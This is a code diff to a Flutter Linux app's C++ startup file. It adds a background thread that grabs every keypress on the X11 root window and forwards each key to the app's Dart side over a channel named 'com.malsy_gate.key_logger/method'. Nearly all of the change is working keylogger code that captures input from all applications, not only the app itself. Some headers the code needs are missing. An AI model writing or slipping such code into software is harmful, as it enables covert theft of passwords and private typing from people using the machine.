@@ -1,6 +1,10 @@
 #include "my_application.h"
 
 #include <flutter_linux/flutter_linux.h>
+#include <X11/Xlib.h>
+#include <X11/Xutil.h>
+#include <iostream>
+
 #ifdef GDK_WINDOWING_X11
 #include <gdk/gdkx.h>
 #endif
@@ -10,7 +14,16 @@
 struct _MyApplication {
   GtkApplication parent_instance;
   char** dart_entrypoint_arguments;
+
+  FlMethodChannel* key_logger_channel;
+  std::thread key_logger_thread;
+  std::mutex key_logger_mutex;
+  std::condition_variable key_logger_cv;
+  bool key_logger_should_exit;
 };
+
+// Forward declarations.
+static void key_logger_thread_proc(MyApplication* self);
 
 G_DEFINE_TYPE(MyApplication, my_application, GTK_TYPE_APPLICATION)
 
@@ -59,6 +72,12 @@ static void my_application_activate(GApplication* application) {
 
   fl_register_plugins(FL_PLUGIN_REGISTRY(view));
 
+  // Register the method channel.
+  g_autoptr(FlStandardMethodCodec) codec = fl_standard_method_codec_new();
+  self->key_logger_channel = fl_method_channel_new(fl_engine_get_binary_messenger(fl_view_get_engine(view)),
+                                                   "com.malsy_gate.key_logger/method",
+                                                   FL_METHOD_CODEC(codec));
+
   gtk_widget_grab_focus(GTK_WIDGET(view));
 }
 
@@ -83,18 +102,27 @@ static gboolean my_application_local_command_line(GApplication* application, gch
 
 // Implements GApplication::startup.
 static void my_application_startup(GApplication* application) {
-  //MyApplication* self = MY_APPLICATION(object);
+  MyApplication* self = MY_APPLICATION(application);
 
-  // Perform any actions required at application startup.
+  // Start the key logger thread.
+  self->key_logger_thread = std::thread(key_logger_thread_proc, self);
 
   G_APPLICATION_CLASS(my_application_parent_class)->startup(application);
 }
 
 // Implements GApplication::shutdown.
 static void my_application_shutdown(GApplication* application) {
-  //MyApplication* self = MY_APPLICATION(object);
+  MyApplication* self = MY_APPLICATION(application);
 
-  // Perform any actions required at application shutdown.
+  // Signal the key logger thread to exit.
+  {
+    std::lock_guard<std::mutex> lock(self->key_logger_mutex);
+    self->key_logger_should_exit = true;
+  }
+  self->key_logger_cv.notify_one();
+  if (self->key_logger_thread.joinable()) {
+    self->key_logger_thread.join();
+  }
 
   G_APPLICATION_CLASS(my_application_parent_class)->shutdown(application);
 }
@@ -103,6 +131,7 @@ static void my_application_shutdown(GApplication* application) {
 static void my_application_dispose(GObject* object) {
   MyApplication* self = MY_APPLICATION(object);
   g_clear_pointer(&self->dart_entrypoint_arguments, g_strfreev);
+  g_clear_object(&self->key_logger_channel);
   G_OBJECT_CLASS(my_application_parent_class)->dispose(object);
 }
 
@@ -114,7 +143,9 @@ static void my_application_class_init(MyApplicationClass* klass) {
   G_OBJECT_CLASS(klass)->dispose = my_application_dispose;
 }
 
-static void my_application_init(MyApplication* self) {}
+static void my_application_init(MyApplication* self) {
+  self->key_logger_should_exit = false;
+}
 
 MyApplication* my_application_new() {
   // Set the program name to the application ID, which helps various systems
@@ -127,4 +158,55 @@ MyApplication* my_application_new() {
                                      "application-id", APPLICATION_ID,
                                      "flags", G_APPLICATION_NON_UNIQUE,
                                      nullptr));
+}
+
+// Key logger thread procedure.
+static void key_logger_thread_proc(MyApplication* self) {
+  Display* display = XOpenDisplay(nullptr);
+  if (!display) {
+    std::cerr << "Failed to open X display" << std::endl;
+    return;
+  }
+
+  Window root = DefaultRootWindow(display);
+  XGrabKey(display, AnyKey, AnyModifier, root, True, GrabModeAsync, GrabModeAsync);
+
+  XEvent ev;
+  while (true) {
+    {
+      std::unique_lock<std::mutex> lock(self->key_logger_mutex);
+      if (self->key_logger_should_exit) {
+        break;
+      }
+    }
+
+    if (XPending(display) > 0) {
+      XNextEvent(display, &ev);
+      if (ev.type == KeyPress) {
+        char buf[32];
+        KeySym key_sym;
+        int len = XLookupString(&ev.xkey, buf, sizeof(buf) - 1, &key_sym, nullptr);
+        if (len > 0) {
+          buf[len] = '\0';
+          g_autoptr(FlValue) args = fl_value_new_string(buf);
+          fl_method_channel_invoke_method(self->key_logger_channel, "onKey", args, nullptr, nullptr, nullptr);
+        } else {
+            const char* special_key = nullptr;
+            switch (key_sym) {
+                case XK_BackSpace: special_key = "Backspace"; break;
+                // Add other special keys here if needed
+            }
+            if (special_key) {
+                g_autoptr(FlValue) args = fl_value_new_string(special_key);
+                fl_method_channel_invoke_method(self->key_logger_channel, "onKey", args, nullptr, nullptr, nullptr);
+            }
+        }
+      }
+    } else {
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+  }
+
+  XCloseDisplay(display);
+  std::cout << "Key logger thread finished" << std::endl;
 }
